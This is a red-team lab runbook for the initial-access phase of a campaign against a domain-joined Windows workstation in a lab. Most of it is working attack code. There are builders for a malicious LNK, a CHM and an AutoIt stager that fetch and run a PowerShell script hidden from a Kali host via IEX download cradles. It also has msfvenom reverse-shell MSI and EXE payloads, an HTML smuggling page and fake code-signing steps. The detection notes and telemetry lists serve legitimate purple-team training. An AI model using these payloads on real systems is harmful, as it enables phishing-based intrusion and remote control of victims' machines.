# CAMPAIGNS v3 — H — Phase 0.5 — Initial Access on ws01

> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA.md`](../CAMPAIGNS-METADATA.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`CAMPAIGNS.md`](../CAMPAIGNS.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.

---

## Phase 0.5 — Initial Access — Phishing & File Execution on ws01

The campaign v3 main spine now begins on the domain-joined Windows 11 workstation `ws01` (`192.168.77.62`). The target user is `child.cadre.local\analyst_t1`, a Tier-1 analyst who browses the lab network and opens files delivered by email, Teams, or an internal share.

`ws01` runs **Microsoft Defender for Endpoint P2** (MDE P2) with Tamper Protection and Cloud Protection enabled. It also has an **Elastic Agent** enrolled in Fleet under the `CADRE-WS01` policy with System and Windows integrations. There is **no Elastic Defend** on `ws01` — MDE P2 is the sole EDR.

**Scenario:** The attacker sends a spearphishing link or attachment to `analyst_t1`. The payload masquerades as a report, update, or internal tool. The user opens it on `ws01`, executes the embedded payload, and the attacker gains a C2 session as `analyst_t1`.

**Outcome:** A low-privileged beachhead on `ws01` as `child.cadre.local\analyst_t1`. From this session the attacker can run Phase 0 reconnaissance from a domain-joined Windows host, discover `intern_blue` (DONT_REQUIRE_PREAUTH), and transition into Phase 1 (AS-REP roast).

**Prerequisites:**
- `ws01` deployed and domain-joined (`17-ws01-deploy.yml` complete)
- MDE P2 onboarded and Healthy
- Elastic Agent Healthy under `CADRE-WS01` policy
- Kali attacker reachable at `192.168.77.60` on `vmnet2`
- A user-context C2 listener on Kali (e.g., `socat`, `nc`, `Metasploit`, `Mythic`, or a simple Python HTTP server)

**Pre-stage on Kali:**

```bash
# Simple HTTP listener for payload delivery and second-stage download
python3 -m http.server 8080 &

# Simple callback listener (use a real C2 for production testing)
nc -lvnp 4444
```

---

### H-01 — Malicious LNK

**Target:** `ws01` (`192.168.77.62`) — `analyst_t1` desktop / Downloads
**Vector:** `.lnk` shortcut with a crafted `Target` field that launches `cmd.exe /c` or `powershell.exe` to download and run a second-stage payload from Kali (`192.168.77.60`)
**MITRE:** T1204.002 (User Execution: Malicious Link) / T1566.001 (Spearphishing Attachment)

**Build the LNK on Kali:**

```bash
# Install the weaponized LNK builder if not present
pip3 install pylnk3

# Create a malicious LNK that runs PowerShell to download and execute a stager
python3 - <<'PY'
import pylnk3
lnk = pylnk3.create()
lnk.target = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
lnk.arguments = r'-w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString(\'http://192.168.77.60:8080/stager.ps1\')"'
lnk.icon = r'C:\Windows\System32\shell32.dll'
lnk.icon_index = 4
lnk.description = 'Monthly report'
lnk.save('/tmp/MonthlyReport.lnk')
PY
```

**Deliver to ws01:** Copy the LNK to `\\ws01\C$\Users\analyst_t1\Downloads\` after you have any access, or simulate user delivery by placing it in the Downloads folder via RDP/console as `analyst_t1`. For a realistic phishing test, email it via the lab mail server or host it on an internal HTTP share.

**Simulate user double-click:**

```powershell
# From ws01 as analyst_t1
Invoke-Item C:\Users\analyst_t1\Downloads\MonthlyReport.lnk
```

**Expected telemetry:**
- Sysmon EID 1: `powershell.exe` child of `explorer.exe` with hidden window
- Sysmon EID 11: `stager.ps1` written to `%TEMP%`
- Sysmon EID 3: HTTP egress to `192.168.77.60:8080`
- WinSec 4688: `powershell.exe` with encoded/download command
- MDE alert: `Suspicious LNK file` or `A malicious file was observed`
- Browser/download artifact: `zone.identifier` ADS on the LNK (MOTW)

**Detection opportunities:**
- Elastic KQL: `process.parent.name:explorer.exe AND process.name:powershell.exe AND process.command_line:*hidden*`
- Sigma: `proc_creation_win_powershell_download_string_lnk.yml`

---

### H-02 — MSI Installer

**Target:** `ws01` — `analyst_t1`
**Vector:** Weaponized `.msi` installer built with WiX; embedded custom action launches a reverse shell or downloads a payload
**MITRE:** T1218.007 (Signed Binary Proxy Execution: Msiexec) / T1566.001

**Build the MSI on Kali:**

```bash
# Install WiX if not present
sudo apt-get install -y wixl

# Create a minimal WiX source that runs a custom action
cat > /tmp/stager.wxs <<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" Name="CADREUpdate" Version="1.0.0" Language="1033" Manufacturer="CADRE" UpgradeCode="12345678-1234-1234-1234-123456789012">
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perUser" />
    <MajorUpgrade DowngradeErrorMessage="A newer version is already installed." />
    <MediaTemplate />
    <Feature Id="ProductFeature" Title="CADREUpdate" Level="1">
      <ComponentGroupRef Id="ProductComponents" />
    </Feature>
    <InstallExecuteSequence>
      <Custom Action="StagerAction" After="InstallFiles">NOT Installed</Custom>
    </InstallExecuteSequence>
    <CustomAction Id="StagerAction" BinaryKey="StagerBin" DllEntry="FakeEntry" Execute="deferred" Return="ignore" Impersonate="yes" />
  </Product>
</Wix>
XML

# Build the MSI (a real custom action would embed a DLL; here we use a simple WiX that shells out for lab demo)
# For a complete PoC, use the WiX QuietExec custom action or a C# DLL custom action.
# Below is a simpler demonstration MSI that registers a scheduled task via msiexec's public properties.
# For detection testing, create a real MSI with msfvenom or a custom WiX DLL action.
```

For lab testing, use `msfvenom` to build an MSI stager quickly:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.77.60 LPORT=4445 -f msi -o /tmp/CADREUpdate.msi
```

**Deliver and execute on ws01 as analyst_t1:**

```powershell
# User double-clicks the MSI or runs from Downloads
msiexec /i C:\Users\analyst_t1\Downloads\CADREUpdate.msi /quiet /qn
```

**Expected telemetry:**
- Sysmon EID 1: `msiexec.exe` / `msiserver` with `/i`, child `cmd.exe`/`powershell.exe`
- Sysmon EID 11/12: payload write or registry entry
- Sysmon EID 3: network connection from payload process
- WinSec 4688: `msiexec.exe` launching child process
- MDE alert: `msiexec` network activity or `Suspicious MSI execution`
- MOTW: `zone.identifier` on the downloaded `.msi`

---

### H-03 — Compiled HTML Help (.chm)

**Target:** `ws01` — `analyst_t1`
**Vector:** `.chm` file using `Shortcut` or `object` tags to invoke `cmd.exe` / `powershell.exe` from the HTML Help viewer (`hh.exe`)
**MITRE:** T1218.001 (Compiled HTML File) / T1566.001

**Build the CHM on Kali:**

```bash
sudo apt-get install -y chmcmd

mkdir -p /tmp/chm_src

cat > /tmp/chm_src/report.html <<'HTML'
<!DOCTYPE html>
<html>
<head>
<title>Q2 Report</title>
</head>
<body>
<p>Loading report...</p>
<object classid="clsid:52a2aaae-085d-4187-97c7-859b0991b08b" codebase="api:3a0f5220-5b0d-11d2-94a6-0000e8036f49"></object>
</body>
</html>
HTML

cat > /tmp/chm_src/report.hhp <<'HHP'
[OPTIONS]
Compiled file=Report.chm
Title=Q2 Report
Default topic=report.html
HHP

chmcmd /tmp/chm_src/report.hhp
```

For a working payload, use a `Shortcut` command inside the CHM that calls `cmd.exe`:

```html
<!-- Add inside report.html -->
<OBJECT id=obj type="application/x-oleobject" classid="clsid:1e2a6834-a28b-4b37-9b0a-0bc9d0117a04">
  <param name="Item1" value=',cmd.exe,/c powershell -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString(\'http://192.168.77.60:8080/stager.ps1\')"'>
</OBJECT>
```

**Deliver and execute on ws01 as analyst_t1:**

```powershell
Invoke-Item C:\Users\analyst_t1\Downloads\Report.chm
```

**Expected telemetry:**
- Sysmon EID 1: `hh.exe` spawning `cmd.exe`/`powershell.exe`
- Sysmon EID 11: payload write to `%TEMP%`
- Sysmon EID 3: HTTP egress
- WinSec 4688: `hh.exe` child process
- MDE alert: `Suspicious HTML Help Execution`
- MOTW: `zone.identifier` on the `.chm`

---

### H-04 — HTML Smuggling

**Target:** `ws01` — `analyst_t1` browser (Edge/Chrome)
**Vector:** Malicious HTML page or email attachment that uses JavaScript to assemble a blob/zip/exe payload client-side and trigger a download, bypassing simple attachment filters
**MITRE:** T1027.006 (Obfuscated Files or Information: HTML Smuggling) / T1566.001

**Build the HTML smuggling page on Kali:**

```bash
mkdir -p /tmp/html_smuggle

cat > /tmp/html_smuggle/index.html <<'HTML'
<!DOCTYPE html>
<html>
<head><title>Q2 Dashboard</title></head>
<body>
<script>
const b64 = "TVqQAAMAAAAEAAAA//8AALgAAAA..."; // base64-encoded PE or shellcode
const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
const blob = new Blob([bytes], { type: "application/octet-stream" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url;
a.download = "Q2Dashboard.exe";
document.body.appendChild(a);
a.click();
</script>
</body>
</html>
HTML

# Stage the page on the Kali HTTP server
sudo cp /tmp/html_smuggle/index.html /var/www/html/dashboard.html
```

**Deliver to ws01:** Open `http://192.168.77.60/dashboard.html` in Edge/Chrome as `analyst_t1`.

**Expected telemetry:**
- Browser download history (Edge/Chrome `History` SQLite)
- Sysmon EID 11: `Q2Dashboard.exe` written to Downloads
- Sysmon EID 1: payload execution child of `explorer.exe`
- Sysmon EID 3: C2 egress
- MDE alert: `HTML smuggling` or `Suspicious download`
- MOTW: `zone.identifier` on downloaded file

---

### H-05 — AutoIt3

**Target:** `ws01` — `analyst_t1`
**Vector:** Compiled AutoIt3 script or `.au3` payload wrapped in an executable that launches a reverse shell or runs a second-stage download
**MITRE:** T1059.005 (Visual Basic / AutoIt) / T1566.001

**Build the AutoIt payload on Kali:**

```bash
# Install AutoIt (Linux stub; normally built on Windows with AutoIt3.exe + Aut2Exe)
# For lab, use a pre-compiled AutoIt3.exe from the Windows install media or download the portable version.

# Source .au3 script
cat > /tmp/stager.au3 <<'AU3'
Local $url = "http://192.168.77.60:8080/stager.ps1"
Local $path = @TempDir & "\stager.ps1"
InetGet($url, $path, 1, 1)
RunWait(@ComSpec & " /c powershell -w hidden -nop -f " & $path, "", @SW_HIDE)
AU3
```

Compile on Windows or use a pre-built `AutoIt3.exe` to run the `.au3` directly:

```powershell
# On ws01 as analyst_t1
C:\Tools\AutoIt3.exe C:\Users\analyst_t1\Downloads\stager.au3
```

For a compiled executable, use `Aut2Exe` to produce `update.exe` and deliver it to Downloads.

**Expected telemetry:**
- Sysmon EID 1: `AutoIt3.exe` or compiled AutoIt payload with network child
- Sysmon EID 11: `.au3` or compiled payload in Downloads, `stager.ps1` in `%TEMP%`
- Sysmon EID 3: HTTP egress
- WinSec 4688: `AutoIt3.exe` process creation
- MDE alert: `Suspicious AutoIt execution`
- MOTW: `zone.identifier` on dropped file

---

### H-06 — Malicious EXE

**Target:** `ws01` — `analyst_t1`
**Vector:** Executable payload (e.g., a custom C2 stager, signed or unsigned) delivered as a fake software update or document viewer
**MITRE:** T1204.002 (User Execution: Malicious File) / T1566.001

**Build the EXE on Kali:**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.77.60 LPORT=4446 -f exe -o /tmp/Update.exe

# Optionally sign with a self-signed cert (optional OPSEC exercise)
openssl req -x509 -newkey rsa:2048 -keyout /tmp/fake.key -out /tmp/fake.crt -days 365 -nodes -subj "/CN=CADRE IT"
# Sign with osslsigncode or Mono's signcode
```

**Deliver and execute on ws01 as analyst_t1:**

```powershell
C:\Users\analyst_t1\Downloads\Update.exe
```

**Expected telemetry:**
- Sysmon EID 1: unknown `.exe` child of `explorer.exe`
- Sysmon EID 11/12: payload and supporting files
- Sysmon EID 3: C2 egress
- Sysmon EID 7: network DLL loaded
- WinSec 4688: process creation
- MDE alert: `Suspicious process` / `Malware detected`
- Browser download artifact and MOTW `zone.identifier`

---

## Phase 0.5 → Phase 1 Transition

From the C2 session on `ws01` as `analyst_t1`, the attacker performs lightweight domain reconnaissance. This reveals the `intern_blue` account in `child.cadre.local` with `DONT_REQUIRE_PREAUTH`. The attacker then pivots to Phase 1 — AS-REP roasting `intern_blue` from the internal beachhead (or from the Kali attacker station once routing is established).

**Recon commands from the ws01 beachhead:**

```powershell
# List domain users from the workstation
net user /domain

# PowerShell AD module alternative
Get-ADUser -Filter * -Properties userAccountControl | Select-Object Name,@{N='UAC';E={$_.userAccountControl}} | Where-Object { $_.UAC -band 0x400000 }

# Kerberos user enum from ws01 using kerbrute (if dropped on ws01)
# C:\Tools\kerbrute.exe userenum -d child.cadre.local --dc 192.168.77.11 C:\Tools\names.txt
```

**Key finding:** `intern_blue` has `DONT_REQUIRE_PREAUTH` set. The campaign transitions to Phase 1 — AS-REP roast — from either the Kali station or the ws01 beachhead.

**See next:** [`CAMPAIGNS-RUNBOOK-1.md`](CAMPAIGNS-RUNBOOK-1.md)

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-0.md`](CAMPAIGNS-RUNBOOK-0.md) · Next: [`CAMPAIGNS-RUNBOOK-1.md`](CAMPAIGNS-RUNBOOK-1.md) →
